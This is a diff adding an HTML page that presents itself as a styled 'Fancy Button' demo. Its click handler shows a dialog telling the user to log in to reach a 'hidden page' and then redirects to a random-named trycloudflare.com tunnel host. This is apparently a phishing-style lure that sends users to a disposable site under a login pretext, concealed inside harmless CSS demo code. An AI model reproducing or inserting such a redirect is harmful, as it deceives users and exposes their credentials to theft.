@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Fancy Button</title>
+<style>
+  /* Center everything */
+  body {
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    height: 100vh;
+    background: linear-gradient(135deg, #6a11cb, #2575fc);
+    font-family: 'Arial', sans-serif;
+  }
+
+  /* Fancy button styles */
+  .fancy-btn {
+    position: relative;
+    padding: 20px 50px;
+    font-size: 24px;
+    color: #fff;
+    background: linear-gradient(45deg, #ff6ec4, #7873f5);
+    border: none;
+    border-radius: 50px;
+    cursor: pointer;
+    overflow: hidden;
+    transition: 0.5s;
+    box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+  }
+
+  .fancy-btn:hover {
+    background: linear-gradient(45deg, #7873f5, #ff6ec4);
+    transform: scale(1.1);
+    box-shadow: 0 15px 30px rgba(0,0,0,0.3);
+  }
+
+  /* Animated shine effect */
+  .fancy-btn::before {
+    content: '';
+    position: absolute;
+    top: -50%;
+    left: -50%;
+    width: 200%;
+    height: 200%;
+    background: rgba(255,255,255,0.2);
+    transform: rotate(45deg);
+    transition: all 0.5s;
+  }
+
+  .fancy-btn:hover::before {
+    left: 100%;
+    top: 100%;
+  }
+</style>
+</head>
+<body>
+
+<button class="fancy-btn" onclick="handleClick()">Click Me</button>
+
+<script>
+function handleClick() {
+    if (confirm("You have to log in first to access the hidden page...\nDISCLAIMER!! DO NOT PROCCED IF YOU FORGOT YOUR PASSWORD!!")) {
+        window.location.href = "https://bin-eyes-advocacy-rankings.trycloudflare.com";
+    }
+}
+</script>
+
+</body>
+</html>
